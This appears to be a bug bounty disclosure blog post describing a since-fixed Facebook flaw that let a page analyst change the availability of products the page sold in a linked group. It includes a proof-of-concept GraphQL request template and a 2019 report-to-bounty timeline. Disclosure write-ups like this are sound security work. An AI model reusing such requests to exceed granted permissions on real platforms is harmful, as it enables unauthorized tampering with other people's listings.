---
layout: post
title: Facebook Change Product Availability as a PageAnalyst
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - onehackzero</p>

## Description

&nbsp;&nbsp;&nbsp;This bug could have let a malicious page analyst modify the availability of an item put up for sale by the page in a group linked to the page.

## Proof of Concept

{% highlight javascript %}
HTTP POST

graph.facebook.com/graphql/

query_id=QUERYID
query_params = {"3":"false","1":"image/jpeg","2":2,"0":{"surface":"GROUP_POST_CHEVRON","actor_id":"PageID","client_mutation_id":"","product_availability":"IN_STOCK","story_id":"<base64 encoded>"}}

{% endhighlight %}

## Timeline

- Jan 4, 2019 - Report Sent
- Jan 10, 2019 - Further investigation by Facebook
- Jan 23, 2019 - Fixed by Facebook
- Jan 25, 2019 - Bounty Awarded by Facebook

<iframe width="560" height="315" src="https://www.youtube.com/embed/JwZw6QJ_d18" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>